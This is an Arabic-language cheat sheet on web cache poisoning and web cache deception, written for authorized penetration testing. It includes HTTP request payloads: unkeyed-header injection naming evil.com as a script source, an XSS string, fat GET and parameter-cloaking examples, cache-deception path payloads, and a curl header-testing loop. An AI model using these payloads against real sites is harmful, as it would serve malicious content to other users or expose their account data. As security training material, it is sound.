<a id="-web-cache-poisoning-cheatsheet"></a>
# 💾 ورقة مرجعية لتسميم ذاكرة الويب المؤقتة

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.it.md">🇮🇹 Versione Italiana</a> | <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

يشير الرسم أعلاه إلى تسميم الذاكرة المؤقتة، وقد حُفظ بتنسيقه الأصلي. مفتاح التخزين المؤقت هو القيم التي تحدّد أي طلبات تشترك في الاستجابة المحفوظة. وتعني Unkeyed أن مُدخلًا ما لا يدخل في هذا المفتاح. يشير XSS إلى البرمجة النصية عبر المواقع.

<a id="-what-is-cache-poisoning"></a>
## 🎯 ما هو تسميم الذاكرة المؤقتة؟

يستغل **تسميم ذاكرة الويب المؤقتة (Web Cache Poisoning)** آلية التخزين المؤقت لحفظ استجابات خبيثة ثم تقديمها إلى مستخدمين آخرين.

<a id="impact"></a>
### الأثر
- 🔴 **هجمات XSS واسعة النطاق** - إيصال XSS مخزّن إلى جميع المستخدمين
- 🔴 **تشويه الموقع** - تخزين محتوى خبيث في الذاكرة المؤقتة
- 🔴 **حجب الخدمة (DoS)** - تخزين استجابات الخطأ في الذاكرة المؤقتة
- 🔴 **هجمات إعادة التوجيه** - إعادة توجيه المستخدمين

---

<a id="-understanding-caching"></a>
## 🔍 فهم التخزين المؤقت

<a id="cache-keys"></a>
### مفاتيح التخزين المؤقت (Cache Keys)
```
# يُحدَّد التخزين المؤقت عادةً بواسطة:
URL + Host header

# لا تدخل في المفتاح (Unkeyed):
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
ترويسات مخصّصة
```

<a id="detect-caching"></a>
### اكتشاف التخزين المؤقت
```bash
# ابحث عن ترويسات التخزين المؤقت
curl -I https://target.com

# مؤشرات التخزين المؤقت:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

<a id="-unkeyed-header-injection"></a>
## 💉 حقن ترويسات غير داخلة في مفتاح التخزين المؤقت

<a id="x-forwarded-host"></a>
### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# إذا ظهرت قيمة evil.com في الاستجابة:
<script src="//evil.com/malicious.js">
```

<a id="x-forwarded-scheme"></a>
### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# قد يتسبب في إعادة توجيه أو التباس في البروتوكول
Location: http://target.com/
```

<a id="x-host"></a>
### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# تحقق من ظهور القيمة المدخلة في الاستجابة
```

<a id="x-original-url--x-rewrite-url"></a>
### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# تجاوز القيود المفروضة على المسار
```

---

<a id="-attack-techniques"></a>
## 🔥 أساليب الهجوم

<a id="basic-cache-poisoning-xss"></a>
### تسميم بسيط للذاكرة المؤقتة باستخدام XSS
```http
# 1. اعثر على مُدخل لا يدخل في المفتاح وتظهر قيمته في الاستجابة
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. تُخزّن الاستجابة المحتوية على XSS في الذاكرة المؤقتة
# 3. يتلقى جميع المستخدمين XSS من الذاكرة المؤقتة
```

<a id="cache-poisoning-via-path"></a>
### تسميم الذاكرة المؤقتة عبر المسار
```http
# طلب بمسارات مختلفة لدى الخادم الأصلي
GET /page;evil HTTP/1.1
Host: target.com

# قد يُخزَّن باستخدام مفتاح مختلف عن المتوقع
```

<a id="fat-get-requests"></a>
### طلبات GET ذات جسم (Fat GET)
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# قد يؤثر الجسم في الاستجابة دون أن يدخل في مفتاح التخزين المؤقت
```

<a id="parameter-cloaking"></a>
### إخفاء المعاملات (Parameter Cloaking)
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# تفسير مختلف لدى الذاكرة المؤقتة والتطبيق
```

---

<a id="-web-cache-deception"></a>
## 🛠️ خداع ذاكرة الويب المؤقتة (Web Cache Deception)

<a id="different-from-poisoning"></a>
### يختلف عن التسميم!
```
# التسميم: تُخزَّن حمولة المهاجم لتُقدَّم إلى الضحايا
# الخداع: تُخزَّن بيانات الضحية ليصل إليها المهاجم

# خطوات خداع ذاكرة الويب المؤقتة:
1. استدرج الضحية لزيارة: /account/settings.css
2. يعيد الخادم /account/settings (متجاهلًا .css)
3. تخزّن الذاكرة المؤقتة الاستجابة كمورد عام
4. يجلب المهاجم /account/settings.css من الذاكرة المؤقتة
5. يحصل على بيانات الضحية الحساسة
```

<a id="payloads"></a>
### الحُمُولات (Payloads)
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

<a id="-cache-buster-technique"></a>
## 📊 تقنية فصل إدخالات التخزين المؤقت (Cache Buster)

<a id="for-testing"></a>
### للاختبار
```http
# أضف قيمة Cache Buster لتجنب التأثير في المستخدمين الآخرين
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# يحصل كل اختبار على مفتاح تخزين مؤقت فريد
```

---

<a id="-tools"></a>
## 🛠️ الأدوات

<a id="param-miner-burp-extension"></a>
### أداة Param Miner (إضافة Burp)
```
1. ثبّت Param Miner من BApp Store
2. انقر بزر الفأرة الأيمن على الطلب ثم اختر Extensions → Param Miner
3. "Guess headers"
4. تحقق من الترويسات التي لا تدخل في المفتاح
```

<a id="manual-testing"></a>
### الاختبار اليدوي
```bash
# اختبر الترويسات
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

<a id="-common-unkeyed-headers"></a>
## 📋 ترويسات شائعة قد لا تدخل في مفتاح التخزين المؤقت

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

<a id="-resources"></a>
## 📚 المراجع

- [دليل PortSwigger لتسميم ذاكرة الويب المؤقتة](https://portswigger.net/web-security/web-cache-poisoning)
- [أبحاث PortSwigger](https://portswigger.net/research/practical-web-cache-poisoning)
- [خداع ذاكرة الويب المؤقتة (Web Cache Deception)](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---



> **توضيحات الدقة:** قوائم الترويسات ومثال `URL + Host header` تبسيط؛ يختلف مفتاح التخزين المؤقت بحسب التنفيذ والإعدادات، وقد تؤثر ترويسة `Vary` في اختيار الاستجابة. لا تُعدّ الترويسة Unkeyed إلا بعد التحقق من سلوك النظام المعني. لا يكفي انعكاس المُدخل وحده: يجب أيضًا تخزين الاستجابة وتقديمها لطلبات الضحايا التي تشترك في المفتاح. لذلك تعني عبارة «جميع المستخدمين» هنا من يتلقون الإدخال المتأثر، وليست جميع زيارات الموقع بالضرورة. راجع [شرح PortSwigger](https://portswigger.net/web-security/web-cache-poisoning) و[عيوب تصميم الذاكرة المؤقتة](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws).
>
> لا يعزل المعامل `cb=random123` الاختبار إلا إذا دخل فعلًا في مفتاح التخزين المؤقت؛ بعض الأنظمة تستبعد سلسلة الاستعلام أو معاملات معيّنة. والأمثلة التي تستخدم الفاصلة المنقوطة أو مسارًا ينتهي بامتداد ملف تعتمد على اختلاف التفسير بين التطبيق والذاكرة المؤقتة، وليست سلوكًا عامًا لكل إطار عمل. راجع [عيوب تنفيذ التخزين المؤقت](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws).
>
> حُفظ مثال Fat GET الأصلي دون تعديل: يحتوي `Content-Length: 25` مع أن النص `callback=alert(document.domain)` طوله 31 بايت ASCII دون فواصل الأسطر. لذلك لا يمثل هذا المثال رسالة كاملة مضبوطة التأطير. تحدد [مواصفة HTTP، القسم 8.6](https://www.rfc-editor.org/rfc/rfc9110.html#section-8.6) الطول بعدد البايتات. كما أن أسطر التعليقات ومقاطع الاستجابة المدرجة ضمن أمثلة الطلبات توضيحية، وليست جميعها أجزاء تُرسل حرفيًا في طلب HTTP؛ ووسم script في المثال جزء مقتطع.

<p align="center">
  <b>💾 سمِّم الذاكرة المؤقتة!</b><br>
  <i>للاختبارات المصرّح بها فقط!</i>
</p>
